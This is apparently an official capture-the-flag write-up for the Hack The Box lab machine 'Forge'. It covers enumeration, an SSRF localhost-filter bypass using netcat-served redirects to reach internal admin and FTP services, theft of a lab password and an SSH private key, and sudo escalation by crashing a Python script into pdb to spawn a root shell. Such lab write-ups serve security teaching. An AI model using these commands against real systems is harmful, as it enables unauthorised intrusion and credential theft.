@@ -1,0 +1,278 @@
+                      Forge
+
+                                                                                  17th January 2022 / Document No D22.100.152
+                                                                                  Prepared By: amra
+                                                                                  Machine Author: NoobHacker9999
+                                                                                  Difficulty: Medium
+                                                                                  Classification: Official
+
+Synopsis
+
+Forge is a medium linux machine that features an SSRF vulnerability on the main webpage that can be
+exploited to access services that are available only on localhost. Specifically, an FTP server is running but it's
+behind a firewall that prevents any connection except from localhost. Virtual host brute forcing reveals a
+new admin virtual host that is also blocked from external connections. The main webpage provides the
+ability to upload image files from URLs, but there are no checks in place to validate if the file is a real image
+or not. Thus allowing an attacker to specify a URL to a machine he controls in order to redirect the traffic to
+the internal services running on the box. Data exfiltration from the internal admin virtual host reveals
+credentials that can be used to access the FTP server, exploiting the same SSRF vulnerability. Through the
+FTP, the SSH key for user can be extracted. Privilege escalation relies on a Python script that user is able
+to execute using sudo. Triggering an error on the script will cause it to execute Pdb , an interactive Python
+debugger that can interpret Python commands. Since Pdb is running as root , because the main script was
+executed using sudo , a root shell can be spawned.
+
+Skills Required
+
+      Enumeration
+      Source code review
+      Vhost enumeration
+
+Skills Learned
+Skills Learned
+
+      Data exfiltration using SSRF
+      SSRF localhost filter bypass
+      Python debugging
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.111 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.111
+
+Nmap output reveals three ports open. On port 21 exists an FTP service that is being blocked by a firewall,
+which is evident due to the filtered state. On port 22 SSH is identified and on port 80 an Apache HTTP
+server is running.
+Nmap also reveals that upon visiting port 80 we are redirected to http://forge.htb . So we modify our
+hosts file accordingly.
+
+   echo "10.10.11.111 forge.htb" | sudo tee -a /etc/hosts
+
+Apache
+
+Let's browse to http://forge.htb .
+The only option available on the page is the one to Upload an image on the top right corner of the
+webpage. Clicking on it we are redirected to http://forge.htb/upload .
+
+Gobuster
+
+Before we start to further explore the webpage we should run Gobuster to search for hidden folders and
+files.
+
+   gobuster dir -u http://forge.htb -w /usr/share/seclists/Discovery/Web-Content/raft-
+   small-words.txt
+A new directory called uploads is discovered. It stands to reason that the uploads directory will be used
+to store the images that are uploaded through the website using the Upload an image option.
+Since the box has virtual hosting enabled as evident by the fact that we are redirected to
+http://forge.htb upon visiting port 80 , Gobuster's vhost mode can be used, which will uncover
+common virtual hosts.
+Switching to Gobuster's vhost option, we must not forget to discard all results that return with redirection
+status code 302 since everything is redirected to forge.htb .
+
+   gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-
+   top1million-5000.txt | grep -v 302
+
+We have successfully discovered a new virtual host, admin.forge.htb . Let's add it to our hosts file so we
+can navigate to it.
+
+   echo "10.10.11.111 admin.forge.htb" | sudo tee -a /etc/hosts
+
+Curl
+
+After the host is added, let's make an HTTP request to the Vhost using Curl.
+   curl http://admin.forge.htb
+We are presented with a message that states Only localhost is allowed! .
+
+Foothold
+
+Now that we have gathered some more information about the webserver, we can proceed to explore the
+Upload an image option on the website.
+
+We have two upload options:
+      Upload from local file
+      Upload from URL
+
+We could attempt to upload a test file, using the Upload local file option to see what happens to the
+file after it gets uploaded. Let's create a PHP file containing "Hello world!".
+
+   echo 'Hello world!' > test.php
+
+After the file is uploaded, the server responds with a URL that contains it. We notice that the name of the file
+has changed to something completely random and the extension is dropped, meaning that the server will
+not execute any uploaded file. But the contents of the file were preserved.
+Focusing our attention on the Upload from url option, we remember that there is an FTP server on the
+box behind a firewall, so using the FTP protocol we might be able to extract files that way, since the firewall
+would probably allow connections coming from localhost.
+
+Trying ftp://127.0.0.1 we get an error message stating that the FTP protocol is invalid and only the HTTP
+and HTTPS protocols can be used.
+Our next step would be to try different localhost addresses such as:
+
+      http://127.0.0.1
+      http://[::1]
+      localhost
+      http://[0:0:0:0:0:0:0:0]
+      http://forge.htb
+The above addresses could be used in order to bypass localhost filtering and exfiltrate data by tricking the
+server into returning its local files, with their contents, however, none of the above worked. Instead we were
+presented with another error message.
+It seems that we have come across some kind of blacklist that prevents us from directly accessing local files
+on the server. Let's try to make a request back to our local machine.
+
+A response is returned on our local machine. One interesting thing to note is that the user agent is a Python
+module called Requests . This information might be useful later on. Since the server is able to reach our
+local machine we could try to redirect the request back to itself using a 301 Moved Permanently or a 302
+Found response.
+
+   echo 'HTTP/1.1 301 Moved Permanently' >> response
+   echo 'Location: http://forge.htb/' >> response
+   echo '' >> response
+   echo '' >> response
+   nc -lvnp 80 < response
+We make, once again, a request to our local machine from the website and this time we have a file returned
+to us on the webpage.
+Using Curl to view the file, we are presented with the HTML code of http://forge.htb , meaning we have
+successfully tricked the server to return its local files.
+
+We have performed a Server Side Request Forgery (SSRF) attack, meaning we can make the server
+access internal components that shouldn't be accessible externally, and return the output to us.
+Since we can access webpages as if we were localhost on forge, we could try to request
+http://admin.forge.htb that specifically stated only localhost requests are allowed. Slightly modifying
+our response file we get the http://admin.forge.htb page back.
+   echo 'HTTP/1.1 301 Moved Permanently' >> response
+   echo 'Location: http://admin.forge.htb/' >> response
+   echo '' >> response
+   echo '' >> response
+   nc -lvnp 80 < response
+Once again we can use Curl to view the returned file:
+
+It seems we have, indeed, a file containing the HTML code of http://admin.forge.htb . Inside the file we
+can see two endpoints. One called /announcements and one called /upload . Since the /upload endpoint
+exists on http://forge.htb too, we modify our response file once again to redirect the request to
+/announcements , which only exists on the admin page.
+
+   echo 'HTTP/1.1 301 Moved Permanently' >> response
+   echo 'Location: http://admin.forge.htb/announcements' >> response
+   echo '' >> response
+   echo '' >> response
+   nc -lvnp 80 < response
+Using Curl to inspect the output:
+The /announcements endpoint holds a lot of valuable information:
+  1. Credentials for an internal ftp server: user:heightofsecurity123! .
+  2. The /upload endpoint supports the FTP protocol on the admin.forge.htb virtual host.
+  3. The /upload endpoint can be used with the ?u= GET parameter to specify an image source.
+
+Having gathered all the information required on how to access the internal FTP server, let's modify our
+response file.
+
+   echo 'HTTP/1.1 301 Moved Permanently' >> response
+   echo 'Location: http://admin.forge.htb/upload?
+   u=ftp://user:heightofsecurity123!@127.0.0.1/' >> response
+   echo '' >> response
+   echo '' >> response
+   nc -lvnp 80 < response
+
+The FTP output can be accessed using Curl as shown previously.
+
+The internal FTP server has been successfully accessed and it seems that the root folder is the home
+directory of a system user called user .
+Trying to authenticate to the SSH server using the acquired credentials yields no results. Using our
+response file we could try to exfiltrate the private SSH key of user , if it exists.
+   echo 'HTTP/1.1 301 Moved Permanently' >> response
+   echo 'Location: http://admin.forge.htb/upload?
+   u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa' >> response
+   echo '' >> response
+   echo '' >> response
+   nc -lvnp 80 < response
+Viewing the returned file, the private key of user is obtained.
+
+We can now use SSH to login to the remote host.
+   curl http://forge.htb/uploads/p09ioa87ZtbW4MxSgypp >> user.key
+   chmod 600 user.key
+   ssh -i user.key user@forge.htb
+
+The user flag can be located in /home/user/ .
+
+Privilege Escalation
+
+On of the first steps of system enumeration is to check for Sudo privileges for the user. As we have already
+acquired their password, the sudo -l command can be used to check for commands that can be executed
+with elevated privileges.
+
+Indeed we are able to execute the Python script located on /opt/remote-manage.py without providing any
+password. Let's take a closer look at the script to identify it's functionality and possible ways to get a root
+shell.
+   #!/usr/bin/env python3
+   import socket
+   import random
+   import subprocess
+   import pdb
+
+   port = random.randint(1025, 65535)
+
+   try:
+          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+          sock.bind(('127.0.0.1', port))
+          sock.listen(1)
+          print(f'Listening on localhost:{port}')
+          (clientsock, addr) = sock.accept()
+          clientsock.send(b'Enter the secret passsword: ')
+          if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
+                 clientsock.send(b'Wrong password!\n')
+          else:
+                 clientsock.send(b'Welcome admin!\n')
+                 while True:
+                         clientsock.send(b'\nWhat do you wanna do: \n')
+                         clientsock.send(b'[1] View processes\n')
+                         clientsock.send(b'[2] View free memory\n')
+                         clientsock.send(b'[3] View listening sockets\n')
+                         clientsock.send(b'[4] Quit\n')
+                         option = int(clientsock.recv(1024).strip())
+                         if option == 1:
+                                clientsock.send(subprocess.getoutput('ps aux').encode())
+                         elif option == 2:
+                                clientsock.send(subprocess.getoutput('df').encode())
+                         elif option == 3:
+                                clientsock.send(subprocess.getoutput('ss -lnt').encode())
+                         elif option == 4:
+                                clientsock.send(b'Bye\n')
+                                break
+
+   except Exception as e:
+          print(e)
+          pdb.post_mortem(e.__traceback__)
+
+   finally:
+          quit()
+
+The script seems like a simple admin control panel, with a hard coded password of secretadminpassword ,
+that can be used to execute system commands, such as ps aux , df and ss -lnt .
+
+Unfortunately, none of the above can be exploited to get a root shell, however, due to the try except
+block at the bottom of the script, in case of an Exception, Pdb is called and the error traceback is passed to
+it.
+Pdb is an interactive source code debugger for Python. If we manage to cause an error, Pdb will spawn a
+Python interactive shell with root privileges, since the script is executed using sudo .
+The line option = int(clientsock.recv(1024).strip()) seems to be a potential failure point, due to
+the fact that we have full control of the input it expects. Particularly, given the conversion command to
+int() and the if checks on the following lines, it expects a numerical input to transform it into an int . If,
+however, a non numerical value is given as an argument to the int() function it will raise an error
+triggering the execution of pdb .
+Let's try to execute the script, connect to it from another SSH session using nc , provide the
+secretadminpassword and sent a single non numerical character as an option.
+
+On one SSH session we execute the script using sudo and on another we trigger Pdb to the original
+session.
+
+The execution is halted after our response with the character a . Back at the original session we have
+successfully triggered Pdb .
+Through the interactive Python shell, commands can be executed. Let's attempt to spawn an interactive
+bash shell using the os Python module.
+
+   import os; os.system('/bin/bash');
+
+A bash shell is successfully spawned and the root flag can be located in root folder.
+
